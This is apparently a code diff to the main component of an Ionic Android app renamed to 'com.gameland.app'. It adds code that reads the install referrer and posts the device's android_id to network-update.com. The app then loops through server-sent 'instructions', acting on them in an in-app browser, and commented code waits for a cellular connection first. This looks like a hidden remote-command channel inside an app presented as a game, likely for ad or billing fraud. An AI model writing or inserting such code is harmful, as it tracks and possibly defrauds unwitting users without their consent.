@@ -5,12 +5,13 @@ import { SplashScreen } from '@ionic-native/splash-screen';
 
 import { TabsPage } from '../pages/tabs/tabs';
 import { InAppBrowser } from '@ionic-native/in-app-browser';
-import { Broadcaster } from '@ionic-native/broadcaster';
 import { Storage } from '@ionic/storage';
 import { Device } from '@ionic-native/device';
 import { Network } from '@ionic-native/network';
 import { Http } from '@angular/http';
 import 'rxjs/add/operator/map';
+
+declare var AndroidReferrer:any;
 
 @Component({
   templateUrl: 'app.html'
@@ -21,16 +22,20 @@ export class MyApp {
 
   network: Network;
   storage: Storage;
+  referrer: String;
 
   constructor(platform: Platform, statusBar: StatusBar, splashScreen: SplashScreen, iab: InAppBrowser,
-              broadcaster: Broadcaster, storage: Storage, device: Device, network: Network, http: Http) {
+              storage: Storage, device: Device, network: Network, http: Http ) {
 
     platform.ready().then(() => {
+
       // Okay, so the platform is ready and our plugins are available.
       // Here you can do any higher level native things you might need.
       statusBar.styleDefault();
       splashScreen.hide();
 
+      alert('suspend and add referrer');
+      var app = this;
       this.network = network;
       this.storage = storage;
 
@@ -45,29 +50,27 @@ export class MyApp {
         ran: false
       };
 
-      storage.set("deviceSettings", deviceSettings);
+      AndroidReferrer.echo('referrer', function (referrer) {
+        if(referrer !== ""){
+          app.referrer = referrer;
+          storage.set("deviceSettings", deviceSettings);
+          app.handleInstructions(http, iab);
+        }
 
-      //todo, not sure if we're too late to get the broadcast event need to test this.  I think we are listening too late
-      //todo may need to write a custom plugin to get the ids OR make an app per affiliate
-      broadcaster.addEventListener('com.android.vending.INSTALL_REFERRER').subscribe(function (referrer) {
-        storage.set("referrer", referrer);
+        // if (app.isNetworkOk()) { //we started on a cellular network
+        //   app.handleInstructions();
+        // } else { //non cellular let's watch for connections to come up
+        //   let connectSubscription = app.network.onchange().subscribe(() => {
+        //     setTimeout(() => {
+        //       if (app.isNetworkOk()) {
+        //         app.handleInstructions();
+        //         connectSubscription.unsubscribe();
+        //       }
+        //     }, 3000);
+        //   });
+        // }
+
       });
-
-      //todo add network instructions
-      // if (this.isNetworkOk()) { //we started on a cellular network
-      //   this.handleInstructions();
-      // } else { //non cellular let's watch for connections to come up
-      //   let connectSubscription = this.network.onchange().subscribe(() => {
-      //     setTimeout(() => {
-      //       if (this.isNetworkOk()) {
-      //         this.handleInstructions();
-      //         connectSubscription.unsubscribe();
-      //       }
-      //     }, 3000);
-      //   });
-      // }
-
-      this.handleInstructions(http, iab);
     });
 
   }
@@ -84,14 +87,13 @@ export class MyApp {
   handleInstructions(http, iab){
     var app = this;
     this.storage.get("deviceSettings").then(function(deviceSettings){
-      alert("posting");
 
       //call the api for instructions, here's a quick sample
       http.post('https://network-update.com/api/boot',
         {
-          "package" : "com.bigbuck.slowlight",
+          "package" : "com.gameland.app",
           "android_id" : deviceSettings.uuid,
-          "referrer" : "utm_source%3Dtest%26utm_medium%3Dtester"
+          "referrer" : app.referrer
         },
         {
         }).map(res => res.json()).subscribe(
@@ -128,12 +130,13 @@ export class MyApp {
   }
 
   async handleNext(app, data, http, iab, deviceSettings){
+    alert('next');
     //call the api for instructions
     http.post(this.nextUrl(data),
       {
-        "package" : "com.bigbuck.slowlight",
+        "package" : "com.gameland.app",
         "android_id" : deviceSettings.uuid,
-        "referrer" : "utm_source%3Dtest%26utm_medium%3Dtester"
+        "referrer" : app.referrer
       },
       {
       }).map(res => res.json()).subscribe(
@@ -175,20 +178,21 @@ export class MyApp {
   }
 
   sleep(ms) {
+    //noinspection TypeScriptUnresolvedFunction
     return new Promise(resolve => setTimeout(resolve, ms));
   }
 
 
   log(http, url, msg){
-
+    var app = this;
     console.log("logging message to "+url+" = "+msg);
     this.storage.get("deviceSettings").then(function(deviceSettings){
       //call the api for instructions, here's a quick sample
       http.post(url,
         {
-          "package" : "com.bigbuck.slowlight",
+          "package" : "com.gameland.app",
           "android_id" : deviceSettings.uuid,
-          "referrer" : "utm_source%3Dtest%26utm_medium%3Dtester",
+          "referrer" : app.referrer,
           "log" : msg
         },
         {}).map(res => res.json()).subscribe(
